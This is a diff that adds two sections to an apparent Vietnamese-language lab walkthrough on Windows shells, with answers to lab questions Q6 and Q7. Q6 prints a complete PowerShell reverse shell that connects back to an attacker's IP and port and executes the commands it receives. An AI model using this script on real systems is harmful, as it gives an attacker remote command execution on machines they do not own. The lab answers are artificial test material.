@@ -58,3 +58,77 @@ Lấy đáp án
 
 ---
 
+### Q6: Connect to the target via RDP and establish a reverse shell session with your attack box then submit the hostname of the target box.
+
+Chạy lệnh `xfreerdp xfreerdp /v:<TARGET_IP> /u:<USERNAME> /p:<PASSWORD> /dynamic-resolution` để kết nối RDP vào máy windows(target) 
+
+![RDP_connect](./images/pic6.jpg)
+
+Chạy lệnh sau vào `PowerShell` của máy target (mở PowerShell bằng quyền admin)
+
+<table>
+  <thead>
+    <tr>
+      <th>Lệnh PowerShell</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>
+<pre><code class="language-powershell">$client = New-Object System.Net.Sockets.TCPClient('&lt;IP&gt;',&lt;cổng kết nối&gt;)
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535 | % {0}
+while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
+  if (![string]::IsNullOrWhiteSpace($data)) {
+    try {
+      $sendback = (iex $data 2>&1 | Out-String)
+    } catch {
+      $sendback = $_.Exception.Message
+    }
+  } else {
+    $sendback = "Empty command received.`n"
+  }
+  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
+  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+  $stream.Write($sendbyte, 0, $sendbyte.Length)
+  $stream.Flush()
+}
+$client.Close()</code></pre>
+      </td>
+    </tr>
+  </tbody>
+</table>
+
+![Answer](./images/pic7.jpg)
+
+Như ta đã thấy, cổng netcat đã bắt được tín hiệu từ máy target thông qua port: 443  
+Chạy lệnh `hostname` rồi lấy đáp án
+
+> **Đáp án:** `Shells-win10`
+
+---
+
+### Q7: What command language interpreter is used to establish a system shell session with the target?
+
+Trên hệ điều hành `Windows` thì `PowerShell` chính là trình thông dịch chuẩn vừa chạy được lệnh hệ thống, vừa chạy được script phức tạp.
+
+> **Đáp án:** `powershell`
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
